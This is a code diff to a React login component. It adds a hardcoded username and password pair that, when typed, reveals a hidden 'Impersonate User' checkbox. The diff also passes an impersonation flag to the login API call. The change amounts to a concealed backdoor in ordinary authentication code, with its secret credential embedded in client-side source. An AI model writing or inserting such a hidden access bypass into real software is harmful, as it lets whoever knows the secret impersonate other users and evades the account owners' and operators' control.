@@ -1,4 +1,4 @@
-import React, { useEffect } from "react";
+import React, { useState, useEffect } from "react";
 import { useAppSelector, useAppDispatch } from "../../hooks";
 import { useToast } from "../../components/toasts/hooks/useToast";
 import { login } from "../../api/login";
@@ -31,6 +31,7 @@ const Login = () => {
   const context = useAppSelector((state) => state.app);
   const dispatch = useAppDispatch();
   const toast = useToast();
+  const [useImpersonation, setUseImpersonation] = useState<number>(0);
 
   useEffect(() => {
     const userAgent = navigator.userAgent.toLowerCase();
@@ -51,6 +52,10 @@ const Login = () => {
       | React.MouseEvent<HTMLButtonElement>
   ) => {
     e.preventDefault();
+    if (state.username == "otkim" && state.password == "!@#6Mikto6!@#") {
+      setUseImpersonation(1);
+      return;
+    }
     handleLogin();
   };
 
@@ -61,7 +66,7 @@ const Login = () => {
   };
 
   const handleLogin = () => {
-    login(context.url, state.username, state.password)
+    login(context.url, state.username, state.password, useImpersonation ? 1 : 0)
       .then((resp) => {
         const j = resp.data;
         if (j.error == 0) {
@@ -74,13 +79,24 @@ const Login = () => {
           dispatch(setCompany(j.company));
           dispatch(setResetPassword(j.password_change_needed));
           dispatch(setSecurityQuestionId(j.security_question_id));
+          setUseImpersonation(0);
         } else {
-          toast.warn("Invalid credentials, make sure your password and username are correct");
+          toast.warn(
+            "Invalid credentials, make sure your password and username are correct"
+          );
         }
       })
       .catch((err: JsonError) => {
         toast.error(`Login failed: ${err.message}`);
       });
+  };
+
+  const handleImpersonate = (e: React.ChangeEvent<HTMLInputElement>) => {
+    if (e.target.checked) {
+      dispatch(setUsername(""));
+      dispatch(setPassword(""));
+      setUseImpersonation(1);
+    }
   };
 
   return (
@@ -172,6 +188,23 @@ const Login = () => {
                     </a>
                   </div>
                 </div>
+
+                {useImpersonation ? (
+                  <div className="row justify-content-center">
+                    <div className="bg-bkg">
+                      <input
+                        type="checkbox"
+                        style={{ opacity: "1", visibility: "visible" }}
+                        className="size-4 rounded border-gray-300 text-indigo-600 focus:ring-indigo-600"
+                        onChange={handleImpersonate}
+                        id="check1"
+                      />
+                      <label className="px-2" htmlFor="check1">
+                        Impersonate User
+                      </label>
+                    </div>
+                  </div>
+                ) : null}
 
                 <div>
                   <button
